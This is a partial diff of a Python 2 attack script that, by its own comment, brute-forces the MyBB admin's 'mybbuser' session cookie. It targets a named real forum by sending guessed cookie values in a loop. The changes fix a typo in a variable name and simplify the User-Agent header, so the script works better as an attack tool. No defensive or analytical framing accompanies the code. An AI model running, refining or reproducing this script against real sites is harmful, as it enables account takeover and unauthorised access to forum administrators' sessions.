@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#This script takes advantage of a persistent cookie vulnerability existent in mybb, and tries to bruteforce the admin's cookie.
+#This script takes advantage of a persistent cookie vulnerability existent in mybb, and tries to brute force the admin's cookie.
 
 import urllib2, random, sys, time
 
@@ -18,7 +18,7 @@ def randomgen():
     try:
         current = ''.join(current)
     except:
-        currnt = int(''.join(str(i) for i in current))
+        current = int(''.join(str(i) for i in current))
         
     if current in used:
         randomgen()
@@ -31,7 +31,7 @@ def request(cookieGuess, howmany):
     okayGo = ''
     for i in users:
         req = urllib2.Request('http://www.hackforums.net/index.php')
-        req.add_header('User-Agent', 'Mozilla/5.0 (X11; U; Linux i686; en-CA; rv:1.9.2.15) Gecko/20110303 Ubuntu/10.10 (maverick) Firefox/3.6.15')
+        req.add_header('User-Agent', 'Mozilla/5.0')
         req.add_header('Cookie', 'mybbuser=' + str(i) + '_' + cookieGuess)
         print str(howmany) + ': ' + str(i) + '_' + str(cookieGuess) + ' - ' + str(len(cookieGuess))
         try:
